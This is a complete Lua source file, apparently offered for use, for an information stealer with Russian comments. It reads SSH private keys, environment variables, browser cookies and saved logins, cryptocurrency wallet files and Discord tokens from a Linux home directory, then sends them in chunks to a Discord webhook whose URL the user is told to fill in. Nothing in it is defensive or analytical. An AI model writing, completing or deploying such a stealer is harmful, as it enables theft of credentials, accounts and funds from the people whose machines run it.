-- language: Lua 5.1+, file: stealer.lua
-- *требует LuaSocket (luasocket) для HTTP-отправки*
-- *запуск: lua stealer.lua*
-- *webhook URL подставь свой*

local http = require("socket.http")
local ltn12 = require("ltn12")
local json = require("json") -- или свой мини-сериализатор ниже

local WEBHOOK_URL = "https://discord.com/api/webhooks/ТВОЙ/ID"

-- === Мини-сериализатор JSON (если нет модуля json) ===
local function escape_json(s)
    s = s:gsub('\\', '\\\\'):gsub('"', '\\"'):gsub('\n', '\\n')
         :gsub('\r', '\\r'):gsub('\t', '\\t')
    return s
end

local function to_json(tbl)
    local parts = {}
    for k, v in pairs(tbl) do
        local val
        if type(v) == "string" then val = '"' .. escape_json(v) .. '"'
        elseif type(v) == "number" or type(v) == "boolean" then val = tostring(v)
        elseif type(v) == "table" then val = to_json(v)
        else val = '"' .. escape_json(tostring(v)) .. '"' end
        table.insert(parts, '"' .. escape_json(k) .. '":' .. val)
    end
    return "{" .. table.concat(parts, ",") .. "}"
end

-- === Сбор данных ===

local function read_file(path)
    local f = io.open(path, "r")
    if not f then return nil end
    local content = f:read("*a")
    f:close()
    return content
end

local function get_os_info()
    local info = {}
    -- uname
    local p = io.popen("uname -a 2>/dev/null")
    if p then info.uname = p:read("*a"); p:close() end
    -- hostname
    p = io.popen("hostname 2>/dev/null")
    if p then info.hostname = p:read("*a"); p:close() end
    -- whoami
    p = io.popen("whoami 2>/dev/null")
    if p then info.user = p:read("*a"); p:close() end
    -- ip
    p = io.popen("curl -s ifconfig.me 2>/dev/null || hostname -I 2>/dev/null")
    if p then info.ip = p:read("*a"); p:close() end
    return info
end

local function get_env()
    local env = {}
    local p = io.popen("env 2>/dev/null")
    if p then
        for line in p:lines() do
            local k, v = line:match("^([^=]+)=(.*)$")
            if k and v then env[k] = v end
        end
        p:close()
    end
    return env
end

local function get_ssh_keys()
    local keys = {}
    local paths = {
        os.getenv("HOME") .. "/.ssh/id_rsa",
        os.getenv("HOME") .. "/.ssh/id_ed25519",
        os.getenv("HOME") .. "/.ssh/id_ecdsa",
        os.getenv("HOME") .. "/.ssh/known_hosts",
        os.getenv("HOME") .. "/.ssh/authorized_keys",
    }
    for _, path in ipairs(paths) do
        local content = read_file(path)
        if content then keys[path] = content end
    end
    return keys
end

local function get_browser_data()
    local data = {}
    local home = os.getenv("HOME") or ""
    -- Chromium-based cookies / logins (Linux paths)
    local chromium_paths = {
        home .. "/.config/google-chrome/Default/Cookies",
        home .. "/.config/google-chrome/Default/Login Data",
        home .. "/.config/chromium/Default/Cookies",
        home .. "/.config/chromium/Default/Login Data",
        home .. "/.config/BraveSoftware/Brave-Browser/Default/Cookies",
        home .. "/.config/BraveSoftware/Brave-Browser/Default/Login Data",
    }
    for _, path in ipairs(chromium_paths) do
        local content = read_file(path)
        if content then data[path] = content end
    end
    -- Firefox
    local firefox_dir = home .. "/.mozilla/firefox"
    local p = io.popen("ls " .. firefox_dir .. " 2>/dev/null")
    if p then
        for profile in p:lines() do
            if profile:match("%.default") then
                local base = firefox_dir .. "/" .. profile
                local cookies = read_file(base .. "/cookies.sqlite")
                local logins = read_file(base .. "/logins.json")
                if cookies then data[base .. "/cookies.sqlite"] = cookies end
                if logins then data[base .. "/logins.json"] = logins end
            end
        end
        p:close()
    end
    return data
end

local function get_wallets()
    local wallets = {}
    local home = os.getenv("HOME") or ""
    local wallet_paths = {
        home .. "/.bitcoin/wallet.dat",
        home .. "/.ethereum/keystore",
        home .. "/.electrum/wallets",
        home .. "/.monero/wallet",
        home .. "/.config/Exodus/exodus.wallet",
    }
    for _, path in ipairs(wallet_paths) do
        local content = read_file(path)
        if content then wallets[path] = content end
    end
    return wallets
end

local function get_discord_tokens()
    local tokens = {}
    local home = os.getenv("HOME") or ""
    -- Discord Local Storage (LevelDB) — ищем токены
    local paths = {
        home .. "/.config/discord/Local Storage/leveldb",
        home .. "/.config/discordcanary/Local Storage/leveldb",
        home .. "/.config/BetterDiscord",
    }
    for _, path in ipairs(paths) do
        local p = io.popen("ls " .. path .. " 2>/dev/null")
        if p then
            for file in p:lines() do
                local content = read_file(path .. "/" .. file)
                if content then
                    -- токены Discord: 24+24+24 символа
                    for token in content:gmatch("[%w%-_%.]+%.[%w%-_%.]+%.[%w%-_%.]+") do
                        if #token > 50 then tokens[#tokens+1] = token end
                    end
                end
            end
            p:close()
        end
    end
    return tokens
end

local function get_installed_packages()
    local pkgs = {}
    local p = io.popen("dpkg -l 2>/dev/null || rpm -qa 2>/dev/null || pacman -Q 2>/dev/null")
    if p then
        for line in p:lines() do pkgs[#pkgs+1] = line end
        p:close()
    end
    return pkgs
end

-- === Отправка в webhook ===

local function send_webhook(payload)
    local body = to_json(payload)
    local response = {}
    local ok, status = http.request{
        url = WEBHOOK_URL,
        method = "POST",
        headers = {
            ["Content-Type"] = "application/json",
            ["Content-Length"] = tostring(#body),
        },
        source = ltn12.source.string(body),
        sink = ltn12.sink.table(response),
    }
    return ok, status, table.concat(response)
end

-- === Главный сбор ===

local function collect_all()
    local data = {}
    data.os = get_os_info()
    data.env = get_env()
    data.ssh = get_ssh_keys()
    data.browsers = get_browser_data()
    data.wallets = get_wallets()
    data.discord_tokens = get_discord_tokens()
    data.packages = get_installed_packages()
    return data
end

-- === Отправка по частям (Discord лимит 2000 символов) ===

local function chunk_string(s, size)
    local chunks = {}
    for i = 1, #s, size do
        chunks[#chunks+1] = s:sub(i, i + size - 1)
    end
    return chunks
end

local function exfiltrate()
    local data = collect_all()
    local serialized = to_json(data)

    -- Сначала отправляем основной лог
    local chunks = chunk_string(serialized, 1900)
    for i, chunk in ipairs(chunks) do
        local payload = {
            content = "**=== DATA CHUNK " .. i .. "/" .. #chunks .. " ===**\n```json\n" .. chunk .. "\n```",
            username = "stealer",
        }
        local ok, status, resp = send_webhook(payload)
        if not ok then
            io.stderr:write("chunk " .. i .. " failed: " .. tostring(resp) .. "\n")
        end
        -- rate limit: 5 запросов / 5 сек
        if i % 3 == 0 then os.execute("sleep 2") end
    end

    -- Отдельно токены Discord (важное — приоритет)
    if #data.discord_tokens > 0 then
        local tok_str = table.concat(data.discord_tokens, "\n")
        local payload = {
            content = "**=== DISCORD TOKENS ===**\n```\n" .. tok_str .. "\n```",
            username = "stealer",
        }
        send_webhook(payload)
    end
end

-- === Запуск ===

exfiltrate()
